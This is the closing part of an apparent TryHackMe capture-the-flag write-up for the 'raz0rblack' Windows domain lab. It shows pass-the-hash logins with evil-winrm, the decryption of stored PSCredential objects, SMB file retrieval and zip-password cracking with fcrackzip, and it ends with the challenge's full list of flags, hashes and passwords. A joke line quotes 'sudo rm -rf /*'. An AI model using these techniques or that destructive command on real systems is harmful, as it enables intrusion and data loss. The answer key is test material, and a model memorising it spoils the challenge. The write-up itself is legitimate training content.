    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">Your Flag is here =&gt;</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000009db56a0543f441469fc81aadb02945d20000000002000000000003660000c000000010000000069a026f82c590fa867556fe4495ca870000000004800000a0000000100000003b5bf64299ad06afde3fc9d6efe72d35500000002828ad79f53f3f38ceb3d8a8c41179a54dc94cab7b17ba52d0b9fc62dfd4a205f2bba2688e8e67e5cbc6d6584496d107b4307469b95eb3fdfd855abe27334a5fe32a8b35a3a0b6424081e14dc387902414000000e6e36273726b3c093bbbb4e976392a874772576d</SS>
    </Props>
  </Obj>
</Objs>
```

We need to decrypt this PSCredential we found here, you can do the following, first, make sure to switch to `lvetrova` session in order to do this due to PowerShell restrictions in order to store credentials:

```
evil-winrm -i 10.201.21.18 -u lvetrova -H 'f220d3988deb3f516c73f40ee16c431d'
```

Then do:

```powershell
$password = "01000000d08c9ddf0115d1118c7a00c04fc297eb010000009db56a0543f441469fc81aadb02945d20000000002000000000003660000c000000010000000069a026f82c590fa867556fe4495ca870000000004800000a0000000100000003b5bf64299ad06afde3fc9d6efe72d35500000002828ad79f53f3f38ceb3d8a8c41179a54dc94cab7b17ba52d0b9fc62dfd4a205f2bba2688e8e67e5cbc6d6584496d107b4307469b95eb3fdfd855abe27334a5fe32a8b35a3a0b6424081e14dc387902414000000e6e36273726b3c093bbbb4e976392a874772576d" | ConvertTo-SecureString  
  
$cred = new-object system.management.automation.pscredential("lvetrova", $password) 
  
$cred.getnetworkcredential() | Select-Object *
```

We get:

![Pasted image 20250925135521.png](../../IMAGES/Pasted%20image%2020250925135521.png)

Flag is:

```
THM{694362e877adef0d85a92e6d17551fe4}
```

Now, `xyan1d3` is the same as before, same XML file with a PSCredential we need to decrypt, time to switch to his shell then:

```
evil-winrm -i 10.201.21.18 -u xyan1d3 -H 'bf11a3cbefb46f7194da2fa190834025'
```

Do:

```
$password = "01000000d08c9ddf0115d1118c7a00c04fc297eb010000006bc3424112257a48aa7937963e14ed790000000002000000000003660000c000000010000000f098beb903e1a489eed98b779f3c70b80000000004800000a000000010000000e59705c44a560ce4c53e837d111bb39970000000feda9c94c6cd1687ffded5f438c59b080362e7e2fe0d9be8d2ab96ec7895303d167d5b38ce255ac6c01d7ac510ef662e48c53d3c89645053599c00d9e8a15598e8109d23a91a8663f886de1ba405806944f3f7e7df84091af0c73a4effac97ad05a3d6822cdeb06d4f415ba19587574f1400000051021e80fd5264d9730df52d2567cd7285726da2" | ConvertTo-SecureString  
  
$cred = new-object system.management.automation.pscredential("xyan1d3", $password) 
  
$cred.getnetworkcredential() | Select-Object *
```

We get:

```
*Evil-WinRM* PS C:\Users\xyan1d3\Documents> $cred.getnetworkcredential() | Select-Object *

UserName Password                                                              SecurePassword Domain
-------- --------                                                              -------------- ------
xyan1d3  LOL here it is -> THM{62ca7e0b901aa8f0b233cade0839b5bb} System.Security.SecureString
```

We got our flag, let's check `twilliams` one, we find this on his directory:

```
*Evil-WinRM* PS C:\users\twilliams> dir


    Directory: C:\users\twilliams


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        9/15/2018  12:19 AM                Desktop
d-r---        2/25/2021  10:18 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos
-a----        2/25/2021  10:20 AM             80 definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_de
                                                 finitely_definitely_not_a_flag.exe
```

Let's run the exe:

```
*Evil-WinRM* PS C:\users\twilliams> .\definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_not_a_flag.exe
Program 'definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_not_a_flag.exe' failed to run: The specified executable is not a valid application for this OS platform.At line:1 char:1
+ .\definitely_definitely_definitely_definitely_definitely_definitely_d ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
At line:1 char:1
+ .\definitely_definitely_definitely_definitely_definitely_definitely_d ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
```

let's check the content inside the file then:

```
Get-Content C:\Users\twilliams\definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_not_a_flag.exe

THM{5144f2c4107b7cab04916724e3749fb0}
```

We got the flag:

![Pasted image 20250925135531.png](../../IMAGES/Pasted%20image%2020250925135531.png)

```
THM{5144f2c4107b7cab04916724e3749fb0
```

Now, we need the secret, let's search for anything containing secret across the domain:

```powershell
Get-ChildItem -Path "C:\" -Include "*secret*" -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        2/25/2021  10:13 AM                Top Secret


    Directory: C:\Program Files\Top Secret


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/25/2021  10:13 AM         449195 top_secret.png
```


We find a `top_secret.png` file, let's download it onto our machine:

```
cd "C:\Program Files\Top Secret"

download top_secret.png
```

Let's check the image:

![Pasted image 20250925135536.png](../../IMAGES/Pasted%20image%2020250925135536.png)

The way to exit vim is `:wq` so that is our answer:

```
:wq
```

We're still missing a question, we need to find the password for a zip file, since I went in the kerberoast way to solve the box, we missed checking SMB, inside of this share, you can find the zip file we need, in order to crack the password of it, you can do this:

```
smbclient \\\\10.10.21.18\\trash -U raz0rblack.thm\\twilliams  
  
get experiment_gone_wrong.zip   
  
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt experiment_gone_wrong.zip
```

You get the following password:

```
electromagnetismo
```

We got all our answers, they are:

**What is the Domain Name?**

```
raz0rblack.thm
```

**What is Steven's Flag?**

```
THM{ab53e05c9a98def00314a14ccbfab8104}
```

**What is the zip file's password?**

```
electromagnetismo
```

**What is Ljudmila's Hash?**

```
f220d3988deb3f516c73f40ee16c431d
```

**What is Ljudmila's Flag?**

```
THM{694362e877adef0d85a92e6d17551fe4}
```

**What is Xyan1d3's password?**

```
cyanide9amine5628
```

**What is Xyan1d3's Flag?**

```
THM{62ca7e0b901aa8f0b233cade0839b5bb}
```

**What is the root Flag?**

```
THM{1b4f46cc4fba46348273d18dc91da20d}
```

**What is Tyson's Flag?**

```
THM{5144f2c4107b7cab04916724e3749fb0}
```

**What is the complete top secret?**

```
:wq
```

**Did you like your cookie?**  
_Say Yes or I will do_ `sudo rm -rf /*` _on your PC_

```
yes
```

![Pasted image 20250925135603.png](../../IMAGES/Pasted%20image%2020250925135603.png)

